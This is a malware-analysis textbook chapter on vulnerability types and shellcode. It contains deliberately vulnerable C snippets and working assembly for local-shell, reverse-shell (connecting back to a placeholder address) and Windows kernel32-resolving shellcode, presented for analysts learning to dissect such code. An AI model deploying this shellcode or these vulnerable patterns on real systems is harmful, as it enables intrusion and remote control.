<html><head></head><body>
		<div><h1 id="_idParaDest-263" class="chapter-number"><a id="_idTextAnchor811"/>8</h1>
			<h1 id="_idParaDest-264"><a id="_idTextAnchor812"/>Handling Exploits and Shellcode</h1>
			<p>At this stage, we are already aware of the different types of malware. What is common among most of them is that they are standalone and can be executed on their own once they reach the targeted system. However, this is not always the case, and some of them are only designed to work properly with the help of targeted legitimate applications.</p>
			<p>In our everyday life, we interact with multiple software products that serve various purposes, from showing us pictures of cats to managing nuclear power plants. Thus, there is a specific category of threats that aim to leverage vulnerabilities hidden in such software to achieve their purposes, whether it is to penetrate the system, escalate privileges, or crash the target application or system to disrupt some important process.</p>
			<p>In this chapter, we will be talking about exploits and learning how to analyze them. To that end, we will cover the following topics:</p>
			<ul>
				<li>Getting familiar with vulnerabilities and exploits </li>
				<li>Cracking the shellcode</li>
				<li>Exploring bypasses for exploit mitigation technologies </li>
				<li>Analyzing Microsoft Office exploits</li>
				<li>Studying malicious PDFs</li>
			</ul>
			<h1 id="_idParaDest-265"><a id="_idTextAnchor813"/><a id="_idTextAnchor814"/><a id="_idTextAnchor815"/>Getting familiar with vulnerabilities and exploits</h1>
			<p>In this section, we will cover what major categories of vulnerabilities and exploits exist and how they are related to each other. We will explain how an attacker can take advantage of a bug (or multiple bugs) to take control of the application (or maybe the whole system) by <a id="_idTextAnchor816"/>performing unauthorized actions in its context.</p>
			<h2 id="_idParaDest-266"><a id="_idTextAnchor817"/>Types of vulnerabilities</h2>
			<p>A vulnerability is a bug or weakness inside an application that can be exploited or abused by an <a id="_idIndexMarker1106"/>attacker to perform unauthorized actions. There are various types of vulnerabilities, most of which are caused by insecure coding practices and mistakes. You should pay attention when processing any input controlled by the end user, including environment variables and dependency modules. In this section, we will explore the most common cases and learn how attackers can leverage them.<a id="_idTextAnchor818"/></p>
			<h3>The stack overflow vulnerability</h3>
			<p>The <strong class="bold">stack overflow</strong> vulnerability is <a id="_idIndexMarker1107"/>one of the <a id="_idIndexMarker1108"/>most common vulnerabilities and the one that is generally addressed first by exploit mitigation technologies. Its risk has been reduced in recent years thanks to new improvements such as the <a id="_idIndexMarker1109"/>introduction of the <strong class="bold">Data</strong> <strong class="bold">Execution Prevention/No Execute</strong> (<strong class="bold">DEP/NX</strong>) technique, which will be covered in greater detail in the <em class="italic">Exploring bypasses for exploit mitigation technologies</em> section. However, under certain circumstances, it can still be successfully exploited or at <a id="_idIndexMarker1110"/>least used to perform a <strong class="bold">Denial of Service</strong> (<strong class="bold">DoS</strong>) attack.</p>
			<p>Let’s take a look at the following simple application written in C:</p>
			<pre class="source-code">
int vulnerable(char *arg)
{
  char Buffer[80];
  strcpy(Buffer, arg);
  return 0;
}
int main (int argc, char *arg<a id="_idTextAnchor819"/>v[])
{
  // the command line argument
  vulnerable(argv[1]);
}</pre>
			<p>As you know, the <a id="_idIndexMarker1111"/>space for the <code>Buffer[80]</code> variable (as any local variable) is allocated on the stack, followed by the EBP register’s <a id="_idIndexMarker1112"/>value, which is pushed at the beginning of the function prologue, and the return address:</p>
			<div><div><img src="img/Figure_8.1_B18500.jpg" alt="Figure 8.1 – Local variable representations in the stack&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.1 – Local variable representations in the stack</p>
			<p>So, by simply passing an argument to this application that’s longer than 80 bytes, the attacker can overwrite all the buffer space, as well as the EBP and the return address. It can take control of the address from which this application will continue executing after the vulnerable function finishes. The following diagram demonstrates overwriting <code>Buffer[80]</code> and the return address with shellcode:</p>
			<div><div><img src="img/Figure_8.2_B18500.jpg" alt="Figure 8.2 – Overwriting Buﬀer[80] and the return address with shellcode&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.2 – Overwriting Buﬀer[80] and the return address with shellcode</p>
			<p>This is the <a id="_idIndexMarker1113"/>most basic stack overflow vulnerability. Now, let’s <a id="_idIndexMarker1114"/>look at other common types of vulnerabilities, such as <strong class="bold">heap ove<a id="_idTextAnchor820"/><a id="_idTextAnchor821"/><a id="_idTextAnchor822"/>rflow</strong>.</p>
			<h3>Heap overflow vulnerabilities</h3>
			<p>In this case, instead <a id="_idIndexMarker1115"/>of using the stack, the affected variable <a id="_idIndexMarker1116"/>would be stored in a dynamically allocated space in memory <a id="_idIndexMarker1117"/>called the <code>malloc</code>, <code>HeapAlloc</code>, or other similar APIs. Windows supports two types of heaps: the default one and the private (that is, dynamic) one(s); all of them follow the <code>_HEAP</code> structure. The default heap’s address is stored in the <code>PEB</code> structure in the <code>ProcessHeap</code> field and can be obtained by calling the <code>GetProcessHeap</code> API; private ones are returned by APIs such as <code>HeapCreate</code> when they are created. All heap addresses (including the default one) are stored in a list that’s pointed to by the <code>ProcessHeaps</code> field of <code>PEB</code>.</p>
			<p>Unlike the stack, the heap doesn’t store return addresses to make it easily exploitable, but there are other ways to abuse it. To understand them, first, we need to learn some basics about the heap structure. The data that’s used by the application is stored in <code>_HEAP_SEGMENT</code> structure and are pointed to in the <code>_HEAP</code> structure. All heap chunks contain a header (the <code>_HEAP_ENTRY</code> structure) and the actual data. However, when the chunk is stored as freed, following the <code>_HEAP_ENTRY</code> structure, it contains a linked list structure, <code>_LIST_ENTRY</code>, that interconnects free chunks. This structure consists of pointers to the previous free chunk (the <code>BLink</code> field) and the next free chunk (the <code>FLink</code> field); the first and the last free chunks in a list are pointed to by the <code>FreeList</code> field of the <code>_HEAP</code> structure. When the system needs to remove a freed chunk from this list (for example, when the chunk is allocated again or as part of the chunk consolidation process), <strong class="bold">unlinking</strong> will take place. It involves writing the next item’s address in the previous item’s next entry, and the previous item’s address in the next item’s previous entry to remove the chunk from a list. The corresponding code will look like this:</p>
			<div><div><img src="img/Figure_8.3_B18500.jpg" alt="Figure 8.3 – Sample code for the unlinking process&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.3 – Sample code for the unlinking process</p>
			<p>By overflowing the variable stored on the heap, the attacker may be able to overwrite the <code>FLink</code> and <code>BLink</code> values of the adjacent chunk, which would make it possible to write anything at any address during the unlinking step, as shown in the preceding screenshot. For example, this can be used to overwrite the address of some existing function that’s guaranteed to be executed with an address of the shellcode to achieve its execution.</p>
			<p>Multiple mitigations <a id="_idIndexMarker1119"/>have been introduced over time to combat <a id="_idIndexMarker1120"/>this technique. Starting from Windows XP SP2, because of additional checks being introduced, attackers had to switch from abusing <code>FreeList</code> to the <code>Lookaside</code> list for a similar purpose. Starting from Windows Vista, among other changes, the <code>Lookaside</code> list was replaced with a <code>Encoding</code> field value, forcing attackers to explore different techniques such as overwriting the <code>_HEAP</code> structure. In Windows 8, Microsoft engineers introduced additional checks and limitations to fight this approach – and this battle is st<a id="_idTextAnchor823"/>ill ongoing.</p>
			<h3>The use-after-free vulnerability</h3>
			<p>This type of <a id="_idIndexMarker1122"/>vulnerability is still widely used, despite all the exploit <a id="_idIndexMarker1123"/>mitigations that were introduced in the later versions of Windows. These vulnerabilities are common in scripting languages such as JavaScript in browsers<a id="_idTextAnchor824"/> or PDF files.</p>
			<p>This vulnerability occurs when an object (a structure in memory, which we will cover in detail in the next chapter) is still being referenced after it has been freed. Imagine that the code looks something like this:</p>
			<pre class="source-code">
OBJECT Buf = malloc(sizeof(OBJECT));
Buf-&gt;address_to_a_func = IsAdmin();
free(Buf);
.... &lt;some code&gt; ....
// execute this function after the buffer was freed
(Buf-&gt;address_to_a_func)();</pre>
			<p>In the preceding code, <code>Buf</code> contains the address of the <code>IsAdmin</code> function, which was executed later, after the whole <code>Buf</code> variable was freed in memory. Do you think <code>address_to_a_func</code> will still be pointing to <code>IsAdmin</code>? Maybe, but if this area was reallocated in <a id="_idIndexMarker1124"/>memory with another variable controlled by the <a id="_idIndexMarker1125"/>attacker, they can set the value of <code>address_to_a_func</code> to the address of their choice. As a result, this could allow the attacker to execute their shellcode and take control of the system.</p>
			<p>In <code>vtable</code> arrays. When a <code>vtable</code> array is overwritten and any function inside this table is called, <a id="_idTextAnchor825"/>the attackers can redirect the execution to their shellcode.</p>
			<h3>Integer overflow vulnerabilities</h3>
			<p>As we know, integer values can take 1, 2, 4, or 8 bytes. Regardless of how much size was granted to store <a id="_idIndexMarker1127"/>them, there are always some numbers that <a id="_idIndexMarker1128"/>are big enough to not fit there. The integer overflow vulnerability happens when the attacker is allowed to introduce a number outside of the range supported by the data unit intended to store it. An example would be making a byte-sized variable storing an unsigned integer, <code>256</code> (<code>100000000b</code>), which will result in storing <code>0</code> (<code>00000000b</code>) as only the last 8 bits would fit into a byte. This may lead to unexpected behavior in the program in favor <a id="_idIndexMarker1129"/>of the attacker, such as allocating a buffer <a id="_idIndexMarker1130"/>whose length is 0 and then writing the data <a id="_idTextAnchor826"/>outside of its scope.</p>
			<h3>Logical vulnerabilities</h3>
			<p>A logical vulnerability is a <a id="_idIndexMarker1131"/>vulnerability that doesn’t require <a id="_idIndexMarker1132"/>memory corruption to be executed. Instead, it abuses the application logic to perform unintended actions. A good example <a id="_idIndexMarker1133"/>of this is <em class="italic">CVE-2010-2729 (MS10-061)</em>, named <strong class="bold">Windows Print Spooler Service Vulnerability</strong>, which is used by the Stuxnet<a id="_idIndexMarker1134"/> malware. Let’s dig deeper into how it works.</p>
			<p>Windows printing APIs allow the user to choose the directory that they wish to copy the file to be printed to. So, with an API named <code>GetSpoolFileHandle</code>, the attacker can get the file handle of the newly created file on the target machine and then easily write any data there with the <code>WriteFile</code> (or similar) API. A vulnerability like this one targets the application logic, which allows the attacker to choose the directory they wish and provides them with a file handle to overwrite this file with <a id="_idTextAnchor827"/>any data they want.</p>
			<p>Different logical vulnerabilities are possible, and there is no specific format for them. This is why there is no universal mitigation for these types of vulnerabilities. However, they are still relatively rare compared to memory corruption ones as they are harder to find and not all of them lead to arbitrary code execution.</p>
			<p>There are other types of vulnerabilities out there, but the types that we have just covered are a cornerstone of other types of vulnerabilities you may witness.</p>
			<p>Now that we have covered how the attacker can force the application to execute its code, let’s take a look at how this code is written and what chal<a id="_idTextAnchor828"/>lenges the attack<a id="_idTextAnchor829"/>er faces when writing it.</p>
			<h2 id="_idParaDest-267"><a id="_idTextAnchor830"/>Types of exploits</h2>
			<p>Generally speaking, an exploit is a piece of code or data that takes advantage of a bug in software to perform an <a id="_idIndexMarker1135"/>unintended behavior. There are several ways exploits can be classified. First of all, apart from the vulnerability that they target, when we talk about exploits, it is vitally important to figure out the actual result of the action being performed. Here are <a id="_idIndexMarker1136"/>some of the most common types:</p>
			<ul>
				<li><strong class="bold">Denial of Service</strong> (<strong class="bold">DoS</strong>): Here, the <a id="_idIndexMarker1137"/>exploit aims to crash either an application or the whole <a id="_idIndexMarker1138"/>system to disrupt its normal operation.</li>
				<li><strong class="bold">Privilege escalation</strong>: In this <a id="_idIndexMarker1139"/>case, the main purpose of the exploit is to elevate <a id="_idIndexMarker1140"/>privileges to give the attacker greater abilities, such as access to more sensitive information.</li>
				<li><strong class="bold">Unauthorized data access</strong>: This group is sometimes merged with the privilege escalation category, from which it differs mainly in scope and vector. Here, the <a id="_idIndexMarker1141"/>attacker gets access to sensitive <a id="_idIndexMarker1142"/>information that’s unavailable in a normal situation with permissions set up. Unlike the previous category, the attacker can’t perform arbitrary actions with different privileges, and the privileges that are used are not necessarily higher in this case – they may be associated with a different user of a similar access level. </li>
				<li><strong class="bold">Arbitrary Code Execution</strong> (<strong class="bold">ACE</strong>): Probably the most powerful and dangerous <a id="_idIndexMarker1143"/>group, it allows the attacker to execute <a id="_idIndexMarker1144"/>arbitrary code and perform pretty much any action. This code is generally referred to as shellcode and will be covered in greater detail in the next section. When the code is being <a id="_idIndexMarker1145"/>executed remotely over the network, we are talki<a id="_idTextAnchor831"/>ng about <strong class="bold">Remote Code Execution</strong> (<strong class="bold">RCE</strong>).</li>
			</ul>
			<p>Depending on the location where the exploit communicates with the targeted software, it is possible to distinguish between the following groups:</p>
			<ul>
				<li><strong class="bold">Local exploits</strong>: Here, exploits are executed on the machine, so the attacker should have already <a id="_idIndexMarker1146"/>established access to it. Common examples include exploits with DoS or privilege escalation functionality.</li>
				<li><strong class="bold">Remote exploits</strong>: This group of exploits targets remote machines, which means they can be <a id="_idIndexMarker1147"/>executed without prior access to the targeted system. A common example is RCE exploits granting this access, but remote DoS exploits are also pretty common.</li>
			</ul>
			<p>Finally, if the exploit <a id="_idIndexMarker1148"/>targets a vulnerability that has<a id="_idTextAnchor832"/>n’t been officially addressed and fixed yet, it is known as a <strong class="bold">zero-day exploit</strong>.</p>
			<p>Now, it is time to deep <a id="_idTextAnchor833"/>dive into various aspects of shellcode.</p>
			<h1 id="_idParaDest-268"><a id="_idTextAnchor834"/>Cracking the shellcode</h1>
			<p>In this section, we <a id="_idIndexMarker1149"/>will take a look at the code that gets executed by the attacker during vulnerability exploitation. This code gets executed in very special conditions without headers and known memory addresses. Let’s learn what she<a id="_idTextAnchor835"/>llcode is and how it’s written for Linux (Intel and ARM processors) a<a id="_idTextAnchor836"/>nd, later, the Windows operating system.</p>
			<h2 id="_idParaDest-269"><a id="_idTextAnchor837"/>What’s shellcode?</h2>
			<p>Shellcode is a list of carefully crafted instructions that can be executed once code has been injected into a <a id="_idIndexMarker1150"/>running application. Due to most of the exploit’s circumstances, the shellcode must be position-independent code (which means it doesn’t need to run in a specific place in memory or require a base relocation table to fix its addresses). Shellcode also has to operate without an executable header or a system loader. For some exploits, it can’t include certain bytes (especially null for the overflows of the string-type buffers).</p>
			<p>Now, let’s take a look at what s<a id="_idTextAnchor838"/><a id="_idTextAnchor839"/><a id="_idTextAnchor840"/>hellcode looks like in Windows and Linux.</p>
			<h2 id="_idParaDest-270"><a id="_idTextAnchor841"/>Linux shellcode in x86-64</h2>
			<p>Linux shellcode is generally <a id="_idIndexMarker1151"/>arranged much simpler than Windows shellcode. Once the program counter register is pointing to the shellcode, the shellcode can <a id="_idIndexMarker1152"/>execute consecutive system calls to spawn a shell, listen on a port, or connect back to the attacker with minimal effort (check out <a href="B18500_11.xhtml#_idTextAnchor1188"><em class="italic">Chapter 11</em></a>, <em class="italic">Dissecting Linux and IoT Malware</em>, for more information about system calls in Linux). The main challenges that attackers face are as follows:</p>
			<ul>
				<li>Getting the absolute address of the shellcode (to be able to access data) </li>
				<li>Removing any null bytes from the shellcode (optional)</li>
			</ul>
			<p>Now, let’s learn how it is possible t<a id="_idTextAnchor842"/>o overcome these challenges. After this, we<a id="_idTextAnchor843"/> will look at different types of shellcode.</p>
			<h3>Getting the absolute address</h3>
			<p>This is a <a id="_idIndexMarker1153"/>relatively easy task. Here, the shellcode abuses the <code>call</code> instruction, which saves the absolute return address in the stack (which the shellcode can get using the <code>pop</code> instruction).</p>
			<p>An example of this is as follows:</p>
			<pre class="source-code">
  call next_ins
next_ins:
  pop eax ; now eax stores the absolute address of next_ins</pre>
			<p>After getting the absolute address, the shellcode can get the address of any data inside the shellcode, like so:</p>
			<pre class="source-code">
  call next_ins
next_ins:
  pop eax ; now eax has the absolute address of next_ins
  add eax, &lt;data_sec – next_ins&gt; ; now, eax stores the address of the data section
data_sec:
  db 'Hello, World',0</pre>
			<p>Another common way to get the absolute address is by using the <code>fstenv</code> FPU instruction. This instruction saves some parameters related to the FPU for debugging purposes, including the absolute address of the last executed FPU instruction. This instruction can be used <a id="_idTextAnchor844"/>like this:</p>
			<pre class="source-code">
_start:
  fldz
  fstenv [esp-0xc]
  pop eax
  add eax, &lt;data_sec – _start&gt;
data_sec:
  db 'Hello, World', 0</pre>
			<p>As you can see, the shellcode was able to obtain the absolute address of the last executed FPU <a id="_idIndexMarker1154"/>instruction, <code>fldz</code>, or in this case the address of <code>_start</code>, which can help in obtaining the address of an<a id="_idTextAnchor845"/>y required data or a string in the shellcode.</p>
			<h3>Null-free shellcode</h3>
			<p>Null-free shellcode is a type of shellcode that has to avoid any null byte to be able to fit a null-terminated string <a id="_idIndexMarker1155"/>buffer. The authors of this shellcode have <a id="_idIndexMarker1156"/>to change the way they write their code. Let’s take a look at an example.</p>
			<p>For the call/pop approach that we described earlier, they will be assembled into the following bytes:</p>
			<div><div><img src="img/Figure_8.4_B18500.jpg" alt="Figure 8.4 – call/pop in OllyDbg&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.4 – call/pop in OllyDbg</p>
			<p>As you can see, because of the relative addresses the call instruction uses, it produced 4 null bytes. For the shellcode authors to handle this, they need the relative address to be negative. It could work in a case like this:</p>
			<div><div><img src="img/Figure_8.5_B18500.jpg" alt="Figure 8.5 – call/pop in OllyDbg with no null bytes&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.5 – call/pop in OllyDbg with no null bytes</p>
			<p>Here are some other examples of the changes the malware authors can make to avoid null bytes:</p>
			<p><a id="_idTextAnchor846"/></p>
			<div><div><img src="img/Table_01.jpg" alt=""/>
				</div>
			</div>
			<p>As you can see, it’s not very hard to do this in shellcode. You will notice that most of the shellcode from <a id="_idIndexMarker1157"/>different exploits (or even the shellcode in Metasploit) is <a id="_idIndexMarker1158"/>null-free by design<a id="_idTextAnchor847"/>, even if the exploit doesn’t necessarily require it<a id="_idTextAnchor848"/>.</p>
			<h3>Local shell shellcode</h3>
			<p>Let’s start <a id="_idIndexMarker1159"/>with a simple <a id="_idIndexMarker1160"/>example that spawns a shell:</p>
			<pre class="source-code">
  jmp _end
_start:
  xor ecx, ecx
  xor eax, eax
  pop ebx     ; load /bin/sh in ebx
  mov al, 11   ; execve syscall ID
  xor ecx, ecx ; no arguments in ecx
  int 0x80     ; syscall
  mov al, 1    ; exit syscall ID
  xor ebx,ebx  ; no errors
  int 0x80     ; syscall
_end:
  call _start
  db '/bin/sh',0</pre>
			<p>Let’s take a closer look at this code:</p>
			<ol>
				<li>First, it executes the <code>execve</code> system call to launch a process, which in this case will be <code>/bin/sh</code>. This represents the shell. </li>
				<li>The <code>execve</code> system call’s prototype looks like this:<pre>int execve(const char *filename, char *const argv[], char
*const envp[]);</pre></li>
				<li>It sets the filename in <code>ebx</code> with <code>/bin/sh</code> by using the call/pop technique to get the absolute address.</li>
				<li>No additional <a id="_idIndexMarker1161"/>command-line arguments need to be specified in this <a id="_idIndexMarker1162"/>case, so <code>ecx</code> is set to zero (<code>xor</code>, <code>ecx</code>, and <code>ecx</code> to avoid the null byte).</li>
				<li>After the shell terminates, the shellcode executes the <code>exit</code> system call, which is defined like this:<pre>void _exit(int status);</pre></li>
				<li>It sets the status to zero in <code>ebx</code> as the program exits norm<a id="_idTextAnchor849"/>ally.</li>
			</ol>
			<p>In this example, you have seen how shellcode can give attackers a shell by launching <code>/bin/sh</code>. For the x64 version, there are a few differences:</p>
			<ul>
				<li><code>int 0x80</code> is replaced by a special Intel instruction, <code>syscall</code>.</li>
				<li>The <code>execve</code> system call ID has changed to 0x3b (59) and <code>exit</code> has changed to 0x3c (60). To know what function each ID represents, check out the official Linux system calls table.</li>
				<li>It uses <code>rdi</code> for the first parameter, <code>rsi</code> for the next, and then <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code>, and the rest in the stack.</li>
			</ul>
			<p>The code will look like this:</p>
			<pre>xor rdx, rdx
push rdx    ; null bytes after the /bin/sh
mov rax, 0x68732f2f6e69622f ; /bin/sh
push rax
mov rdi, rsp
push rdx    ; null arguments for /bin/sh
push rdi
mov rsi, rsp
xor rax, rax
mov al, 0x3b  ; execve system call
syscall
xor rdi, rdi
mov rax, 0x3c ; exit system call
syscall</pre>
			<p>As you can see, there <a id="_idIndexMarker1163"/>are no big differences between x86 and x64 when it comes <a id="_idTextAnchor850"/>to <a id="_idIndexMarker1164"/>the shellcode. Now, let’s take a look at more advanced types of she<a id="_idTextAnchor851"/>llcode.</p>
			<h3>Reverse shell shellcode</h3>
			<p>The reverse shell <a id="_idIndexMarker1165"/>shellcode is one of the most widely used types <a id="_idIndexMarker1166"/>of shellcode. This shellcode connects to the attacker and provides them with a shell on the remote system to gain full access to the remote machine. For this to happen, the shellcode needs to follow these steps:</p>
			<ol>
				<li value="1"><code>socket</code>. Here is the definition of this function:<pre>int socket(int domain, int type, int p<a id="_idTextAnchor852"/>rotocol);</pre></li>
			</ol>
			<p>You will usually see it being used like this:</p>
			<pre><strong class="bold">socket(AF_INET, SOCK_STREAM, IPPROTO_IP);</strong></pre>
			<p>Here, <code>AF_INET</code> represents most of the known internet protocols, including <code>IPPROTO_IP</code> for the IP protocol. <code>SOCK_STREAM</code> is used to represent TCP communication. From <a id="_idIndexMarker1167"/>this system call, you can understand <a id="_idIndexMarker1168"/>that this shellcode is communicating with the attacker through TCP. The assembly code looks like this:</p>
			<pre>xor edx, edx  ; cleanup edx
push edx      ; protocol=IPPROTO_IP (0x0)
push 0x1      ; socket_type=SOCK_STREAM (0x1) 
push 0x2      ; socket_family=AF_INET (0x2)
mov ecx, esp  ; pointer to socket() args
xor ebx, ebx
mov bl, 0x1   ; SYS_SOCKET
xor eax,eax
mov al, 0x66  ; socketcall syscall ID
int 0x80
xchg edx, eax ; edx=sockfd (the returned socket)</pre>
			<p>Here, the shellcode uses the <code>socketcall</code> system call (with ID 0x66). This system call represents many system calls, including <code>socket</code>, <code>connect</code>, <code>listen</code>, <code>bind</code>, and so on. In <code>ebx</code>, the shellcode sets the function it wants to execute from the <code>socketcall</code> list. Here is a snippet of the list of functions supported by <code>socketcall</code>:</p>
			<pre>SYS_SOCKET 1
SYS_BIND 2
SYS_CONNECT 3
SYS_LISTEN 4
SYS_ACCEPT 5</pre>
			<p>The shellcode pushes the arguments to the stack and then sets <code>ecx</code> to point to the list of arguments, sets <code>ebx = 1</code> (<code>SYS_SOCKET</code>), sets the system call ID in <code>eax</code> (<code>socketcall</code>), and then executes the system call.</p>
			<ol>
				<li value="2"><code>sockaddr_in</code> with the IP, port, and, again, <code>AF_INET</code>. Then, the shellcode executes the <code>connect</code> function from the <code>socketcall</code> list of functions. The prototype looks like this:<pre>int connect(int sockfd, const struct sockaddr *addr,sockle<a id="_idTextAnchor853"/>n_t addrlen);</pre></li>
			</ol>
			<p>The assembly code will look as follows:</p>
			<pre>push 0x0101017f ; sin_addr=127.1.1.1 (network byte order)
xor ecx, ecx
mov cx, 0x3905
push cx      ; sin_port=1337 (network byte order)
inc ebx
push bx      ; sin_family=AF_INET (0x2)
mov ecx, esp    ; save pointer to sockaddr struct
push 0x10      ; addrlen=16
push ecx      ; pointer to sockaddr
push edx      ; sockfd
mov ecx, esp    ; save pointer to sockaddr_in struct
inc ebx      ; sys_connect (0x3)
int 0x80      ; exec sys_connect</pre>
			<ol>
				<li value="3"><code>dup2</code> that overwrites the standard input, output, and error output with the socket one. Here is the assembly code for this step:<pre>  push 0x2
  pop ecx       ; set loop counter
  xchg ebx, edx ; save sockfd
; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
loop:
  mov al, 0x3f  ; sys_dup2 systemcall ID
  int 0x80
  dec ecx       ; decrement loop-counter
  jns loop      ; as long as SF is not set -&gt; continue</pre></li>
			</ol>
			<p>In the preceding code, the shellcode overwrites <code>stdin (0)</code>, <code>stdout (1)</code>, and <code>stderr (2)</code> with <code>sockfd</code> (the socket handle) to redirect any input, output, and errors to the attacker, respectively.</p>
			<ol>
				<li value="4"><code>execve</code> call with <code>/bin/sh</code>, as we saw in the pr<a id="_idTextAnchor854"/>evious section.</li>
			</ol>
			<p>Now that you have seen more advanced shellcode, you can understand most of the well-known shellcode and the methodology behind them. For binding a shell or downloading and executing shellcode, the code is very similar, and it uses similar system calls and maybe one or two extra functions. You will need to check the definition of every system call and <a id="_idIndexMarker1173"/>what arguments it takes before analyzing the <a id="_idIndexMarker1174"/>shellcode based on that.</p>
			<p>That’s it for x86 (both 32-bit and 64-bit). Now, let’s tak<a id="_idTextAnchor855"/>e a quick look at ARM shellcoding and the differences be<a id="_idTextAnchor856"/>tween it and x86.</p>
			<h2 id="_idParaDest-271"><a id="_idTextAnchor857"/>Linux shellcode for ARM</h2>
			<p>The shellcode on ARM systems is very similar to the shellcode that uses the x86 instruction set. It’s <a id="_idIndexMarker1175"/>even easier for the shellcode authors to write in ARM <a id="_idIndexMarker1176"/>as they don’t have to use the call/pop technique or <code>fstenv</code> to get the absolute address. In ARM assembly language, you can access the program counter register (<code>pc</code>) directly from the code, which makes this even simpler. Instead of <code>int 0x80</code> or <code>syscall</code>, the shellcode uses <code>svc #0</code> or <code>svc #1</code> to execute a system function. An example of ARM shellcode for executing a local shell is as follows:</p>
			<pre class="source-code">
_start:
  add r0, pc, #12 
  mov r1, #0
  mov r2, #0
  mov r7, #11 ; execve system call ID
  svc #1
.ascii "/bin/sh\0"</pre>
			<p>In the preceding code, the shellcode sets <code>r0</code> with the program counter (pc) + 12 to point to the <code>/bin/sh</code> string. Then, it sets the remaining arguments for the <code>execve</code> system call and calls the <code>svc</code> instruction t<a id="_idTextAnchor858"/><a id="_idTextAnchor859"/>o execute the code.</p>
			<h3>Null-free shellcode</h3>
			<p>ARM instructions are usually 32-bit instructions. However, many shellcodes<a id="_idIndexMarker1177"/> switch to Thumb Mode, which sets the instructions to be 16 bits only and reduces the chances of having null bytes. For the shellcode to switch to Thumb Mode, it is common to use the <code>BX</code> <a id="_idTextAnchor860"/>or <code>BLX</code> instructions.</p>
			<p>After executing it, all instructions switch to the 16-bit mode, which reduces null bytes significantly. By using <code>svc #1</code> instead of <code>svc #0</code> and avoiding immediate null values and instructions that include null bytes, the shellcode can reach the null-free goal.</p>
			<p>When analyzing ARM shellcode, make sure that you disassemble all the instructions after the mode switches to 16-bit rather than 32-bit.</p>
			<p>Now that we have covered Linux shellcode for Intel and ARM processor<a id="_idTextAnchor861"/>s, let’s take a look a<a id="_idTextAnchor862"/>t Windows shellcode.</p>
			<h2 id="_idParaDest-272"><a id="_idTextAnchor863"/>Windows shellcode</h2>
			<p>Windows shellcode is <a id="_idIndexMarker1178"/>more complicated than its Linux counterpart. In Windows, you can’t directly use <code>sysenter</code> or interrupts like in Linux as the system function IDs change from one version to another. Windows provides interfaces to access their functionality in libraries, such as <code>kernel32.dll</code>. Windows shellcode has to find the base address of <code>kernel32.dll</code> and go through its export table to get the required APIs to implement their functionality. In terms of socket APIs, attackers may need to load additional DLLs using <code>LoadLibraryA</code>/<code>LoadLibraryExA</code>.</p>
			<p>Windows shellcode follows these steps to achieve its target:</p>
			<ol>
				<li value="1">Get the absolute address (we covered this in the previous section).</li>
				<li>Get the base address of <code>kernel32.dll</code>.</li>
				<li>Get the required APIs from <code>kernel32.dll</code>.</li>
				<li>Execute the payload.</li>
			</ol>
			<p>Now that we’ve covered how shellcode gets its absolute address, let’s look at how it gets the base add<a id="_idTextAnchor864"/><a id="_idTextAnchor865"/>ress of <code>kernel32.dll</code>.</p>
			<h3>Getting the base address of kernel32.dll</h3>
			<p><code>kernel32.dll</code> is the <a id="_idIndexMarker1179"/>main DLL that’s used by shellcode. It has APIs such as <code>LoadLibrary</code>, which allows <a id="_idIndexMarker1180"/>you to load other libraries, and <code>GetProcAddress</code>, which gets the address of any API inside a library that’s loaded in memory.</p>
			<p>To access any API inside any DLL, the shellcode must get the address of <code>kernel32.dll</code> and<a id="_idTextAnchor866"/> parse its export table.When an application is being loaded into memory, the <a id="_idIndexMarker1181"/>Windows OS loads its core libraries, such as <code>kernel32.dll</code> and <code>ntdll.dll</code>, and saves the <a id="_idIndexMarker1182"/>addresses and other information about these libraries inside the <code>kernel32.dll</code> from the PEB as follows (for 32-bit systems):</p>
			<pre class="source-code">
mov eax,dword ptr fs:[30h]
mov eax,dword ptr [eax+0Ch]
mov ebx,dword ptr [eax+1Ch]
mov ebx,dword ptr [ebx]
mov esi,dword ptr [ebx+8h]</pre>
			<p>The first line gets the PEB address from the FS segment register (in x64, it will be the GS register and a different offset). Then, the second and the third lines get <code>PEB-&gt;LoaderData-&gt;InInitializationOrderModuleList</code>.</p>
			<p><code>InInitializationOrderModuleList</code> is a DLL that contains information about all the loaded modules (PE files) in memory (such as <code>kernel32.dll</code>, <code>ntdll.dll</code>, and the application itself), along with the base address, the filename, and other information.</p>
			<p>The first entry that you will see in <code>InInitializationOrderModuleList</code> is <code>ntdll.dll</code>. To get <code>kernel32.dll</code>, the shellcode must go to the next item in the list. So, in the fourth line, the shellcode gets the next item while following the forward link (<code>ListEntry-&gt;FLink</code>). It gets the base address from the available<a id="_idTextAnchor867"/> information about t<a id="_idTextAnchor868"/>he DLL in the fifth line.</p>
			<h3>Getting the required APIs from kernel32.dll</h3>
			<p>For the shellcode <a id="_idIndexMarker1183"/>to be able to access the APIs of <code>kernel32.dll</code>, it should parse its export table. The export table consists of three arrays. The first array is <code>AddressOfNames</code>, which contains the names of the <a id="_idIndexMarker1184"/>APIs inside the DLL file. The second array is <code>AddressOfFunctions</code>, which contains the <strong class="bold">relative addresses</strong> (<strong class="bold">RVAs</strong>) of all of these APIs:</p>
			<div><div><img src="img/Figure_8.6_B18500.jpg" alt="Figure 8.6 – Export table structure (the numbers are not real and have been provided as an example)&#13;&#10;"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.6 – Export table structure (the numbers are not real and have be<a id="_idTextAnchor869"/>en provided as an example)</p>
			<p>However, the issue here is that these two arrays are aligned with a different alignment. For example, <code>GetProcAddress</code> could be in the third item in <code>AddressOfNames</code>, but it’s in the fifth item in <code>AddressOfFunctions</code>.</p>
